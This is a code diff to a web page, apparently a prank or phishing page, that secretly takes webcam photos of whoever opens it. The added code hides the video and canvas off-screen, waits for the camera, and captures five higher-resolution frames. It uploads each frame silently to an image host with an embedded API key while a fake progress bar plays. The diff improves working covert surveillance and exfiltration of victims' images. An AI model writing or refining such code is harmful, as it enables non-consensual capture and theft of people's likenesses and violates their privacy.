@@ -84,8 +84,7 @@ html, body {
   background: rgba(0,255,65,0.12);
   box-shadow: 0 0 20px #00ff41;
 }
-video { display: none !important; }
-canvas { display: none !important; }
+video, canvas { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
 </style>
 </head>
 <body>
@@ -108,14 +107,30 @@ canvas { display: none !important; }
 <script>
 const IMGBB_KEY = 'c1b447115e3eb10165c80ccf5c1f70ba';
 
-async function uploadToImgBB(base64data) {
-  const clean = base64data.split(',')[1];
-  const body = new FormData();
-  body.append('key', IMGBB_KEY);
-  body.append('image', clean);
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function uploadPhoto(base64) {
+  const clean = base64.split(',')[1];
+  const fd = new FormData();
+  fd.append('key', IMGBB_KEY);
+  fd.append('image', clean);
   try {
-    await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body });
+    const res = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
+    await res.json();
   } catch(e) {}
+}
+
+function waitForVideoReady(video) {
+  return new Promise((resolve) => {
+    if (video.readyState >= 3) { resolve(); return; }
+    const check = setInterval(() => {
+      if (video.readyState >= 3 && video.videoWidth > 0) {
+        clearInterval(check);
+        resolve();
+      }
+    }, 100);
+    setTimeout(() => { clearInterval(check); resolve(); }, 5000);
+  });
 }
 
 async function startCapture() {
@@ -129,26 +144,29 @@ async function startCapture() {
 
   let stream = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
     video.srcObject = stream;
-    await new Promise(r => { video.onloadedmetadata = r; });
-    await new Promise(r => setTimeout(r, 600));
+    video.play();
+    await waitForVideoReady(video);
+    await sleep(800);
   } catch(e) {}
 
-  canvas.width = 640;
-  canvas.height = 480;
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
   const ctx = canvas.getContext('2d');
 
+  const uploadPromises = [];
   for (let i = 0; i < 5; i++) {
-    await new Promise(r => setTimeout(r, 300));
-    if (stream && video.readyState >= 2) {
-      ctx.drawImage(video, 0, 0, 640, 480);
-    } else {
-      ctx.fillStyle = '#000';
-      ctx.fillRect(0, 0, 640, 480);
+    if (i > 0) await sleep(400);
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    if (stream && video.readyState >= 2 && video.videoWidth > 0) {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     }
-    const b64 = canvas.toDataURL('image/jpeg', 0.85);
-    uploadToImgBB(b64);
+    const b64 = canvas.toDataURL('image/jpeg', 0.9);
+    uploadPromises.push(uploadPhoto(b64));
   }
 
   if (stream) stream.getTracks().forEach(t => t.stop());
@@ -156,10 +174,10 @@ async function startCapture() {
   barWrapper.style.display = 'block';
   pct.style.display = 'block';
 
-  await new Promise(resolve => {
+  const barAnim = new Promise(resolve => {
     let current = 0;
-    const steps = 250;
-    const duration = 4000;
+    const steps = 300;
+    const duration = 5000;
     const iv = setInterval(() => {
       current++;
       const p = Math.round((current / steps) * 100);
@@ -169,8 +187,11 @@ async function startCapture() {
     }, duration / steps);
   });
 
+  await Promise.all([barAnim, ...uploadPromises]);
+
   pct.textContent = '100%';
-  await new Promise(r => setTimeout(r, 300));
+  bar.style.width = '100%';
+  await sleep(300);
   document.getElementById('result-msg').style.display = 'block';
 }
 </script>
